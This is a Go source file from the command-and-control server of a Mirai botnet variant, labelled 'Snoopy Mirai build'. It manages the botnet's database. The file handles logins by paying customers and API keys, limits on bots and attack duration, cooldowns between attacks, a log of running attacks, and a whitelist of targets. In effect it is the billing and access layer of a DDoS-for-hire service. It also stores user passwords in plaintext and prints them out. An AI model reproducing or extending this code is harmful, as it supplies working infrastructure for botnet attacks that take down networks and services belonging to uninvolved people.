package main

import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
	db *sql.DB
}

type AccountInfo struct {
	username string
	maxBots  int
	admin    int
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("\x1b[38;5;255mSnoopy Mirai build\r\n")
	fmt.Println("\x1b[38;5;255mVersion [\x1b[38;5;10m1\x1b[38;5;255m]\r")
	return &Database{db}
}

func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}

func (this *Database) runningatk() int {
	var count int
	row := this.db.QueryRow("SELECT COUNT(*) FROM `history` WHERE  `duration` + `time_sent` > UNIX_TIMESTAMP()")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) TotalUsers() int {
	rows, err := this.db.Query("SELECT COUNT(*) as count FROM  users")
	var f = checkCount(rows)
	checkErr(err)
	return f
}

func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}

func checkCount(rows *sql.Rows) (count int) {
	for rows.Next() {
		err := rows.Scan(&count)
		checkErr(err)
	}
	return count
}

func checkErr(err error) {
	if err != nil {
		panic(err)
	}
}

func (this *Database) ongoingIds() int {
	var count int
	row := this.db.QueryRow("SELECT id FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) getusers() string {
	rows, err := this.db.Query("SELECT username, password, duration_limit, cooldown, max_bots, admin FROM `users`")
	if err != nil {
		fmt.Println(err)
		return ""
	}
	defer rows.Close()

	var result string
	count := 1
	for rows.Next() {
		var username, password string
		var durationLimit, cooldown, maxBots int
		var admin bool
		err = rows.Scan(&username, &password, &durationLimit, &cooldown, &maxBots, &admin)
		if err != nil {
			fmt.Println(err)
			continue
		}
		result += fmt.Sprintf("%d. %s | %s | %d | %d | %d | %t\r\n", count, username, password, durationLimit, cooldown, maxBots, admin)
		count++
	}
	return result
}

func (this *Database) ongoingCommands() string {
	var command string
	row := this.db.QueryRow("SELECT command FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
	err := row.Scan(&command)
	if err != nil {
		fmt.Println(err)
	}
	return command
}

func (this *Database) ongoingDuration() int {
	var count int
	row := this.db.QueryRow("SELECT duration FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) ongoingBots() int {
	var count int
	row := this.db.QueryRow("SELECT max_bots FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
	err := row.Scan(&count)
	if err != nil {
		fmt.Println(err)
	}
	return count
}

func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
	return true
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		// Parse prefix
		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > netmask { // Whitelist is less specific than attack target
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask { // Attack target is less specific than whitelist
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else { // Both target and whitelist have same prefix
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
	}
	var userId, durationLimit, admin, cooldown uint32
	if !rows.Next() {
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &admin, &cooldown)

	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}
	rows.Close()

	if admin == 0 {
		rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}

	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
	return true, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}

func (this *Database) RemoveUser(username string) bool {
	rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false
	}
	this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
	return true
}
